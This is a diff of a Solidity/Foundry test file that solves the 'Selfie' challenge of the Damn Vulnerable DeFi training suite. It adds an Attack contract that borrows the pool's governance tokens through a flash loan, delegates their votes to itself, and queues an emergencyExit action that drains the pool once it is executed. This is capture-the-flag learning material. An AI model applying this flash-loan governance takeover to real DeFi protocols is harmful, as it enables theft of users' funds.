@@ -5,7 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
-import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +62,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+
+        Attack attackContract = new Attack(address(pool), address(governance));
+        pool.flashLoan(IERC3156FlashBorrower(address(attackContract)), address(token), TOKENS_IN_POOL, data);
+
+        vm.warp(3 days);
+        governance.executeAction(1);
+
+        console.log(token.balanceOf(address(pool)));
     }
 
     /**
@@ -72,5 +80,31 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attack is IERC3156FlashBorrower {
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+
+    constructor(address _pool, address _governance) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+    }
+
+    function onFlashLoan(
+        address,
+        address token,
+        uint256 amount,
+        uint256,
+        bytes calldata data
+    ) external returns (bytes32) {
+        // voting logic)
+        DamnValuableVotes(token).delegate(address(this));
+
+        governance.queueAction(address(pool), 0, data);
+
+        DamnValuableVotes(token).approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
